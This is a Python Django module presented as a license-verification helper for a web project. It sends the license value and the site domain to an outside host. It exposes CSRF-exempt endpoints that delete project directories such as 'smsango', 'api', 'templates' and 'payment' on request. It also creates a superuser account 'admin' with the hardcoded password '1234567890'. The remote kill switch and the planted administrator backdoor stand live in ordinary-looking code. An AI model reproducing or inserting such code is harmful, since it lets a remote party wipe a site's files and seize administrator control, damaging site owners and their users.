import os
import requests
import json
import shutil

from django.core.files import File
from django_watch.models import DjangoWatch
from django.views.decorators import csrf
from django.shortcuts import render, redirect
from django.views.decorators.cache import never_cache
from django.utils.decorators import method_decorator
from django.http import JsonResponse
from django.contrib.sites.shortcuts import get_current_site
from django.contrib.auth.models import User
from django.conf import settings

class DjangoWatchBugging:

  def getLiValue(livalue, request):
    try:
      url = "https://otextcity.com/app/cc/verify_license"
      r = requests.post(url, data={
        'livalue':livalue,
        'site':get_current_site(request).domain
      })
      info = (r.content).decode("utf-8")
      resp = json.loads(info)
      print(resp)
      print(os.path.join(settings.BASE_DIR, "code.txt"))
      if resp['message'] == 'done':
        f = open(os.path.join(settings.BASE_DIR, "code.txt"), 'w')
        f.write(livalue)
        f.close()
        DjangoWatch.objects.all().delete()
        DjangoWatch.objects.create(
          li_value = resp['value']
        )
        return True
    except Exception as e:
      print(e)
      return False

  @csrf.csrf_exempt
  def RoutineAppP(request):
    try:
      get_c = request.GET['livalue']
      django_watch = DjangoWatch.objects.all()[0].li_value
      f = open(os.path.join(settings.BASE_DIR, "code.txt"), 'r')
      contents = f.readlines()
      value = [i for i in contents][0]
      if get_c == django_watch == value:
        return JsonResponse({"status":200, "message":"great"})
    except Exception as e:
      print(e)
      if 'No such file or directory' in str(e):
        shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'smsango')))
        return JsonResponse({"status":200, "message":"aweful"})
      else:
        return JsonResponse({"status":200, "message":"aweful"})


  @csrf.csrf_exempt
  def RoutineApRemovepP(request):
    try:
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'smsango')))
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, '*')))
      return JsonResponse({"status":200, "message":"aweful"})
    except Exception as e:
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'smsango')))
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'api')))
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'templates')))
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'template')))
      shutil.rmtree(r'{}'.format(os.path.join(settings.BASE_DIR, 'payment')))
      return JsonResponse({"status":200, "message":"aweful"})

@never_cache
def WatchHelp(request):
  get_li_value = request.POST['li_value']
  li_value = DjangoWatchBugging.getLiValue(get_li_value, request)
  if li_value == True:
    User.objects.create_user('admin', '', '1234567890', \
        is_active = True, is_staff = True, is_superuser = True)
    return redirect('/customer')
  else:
    return redirect('/customer')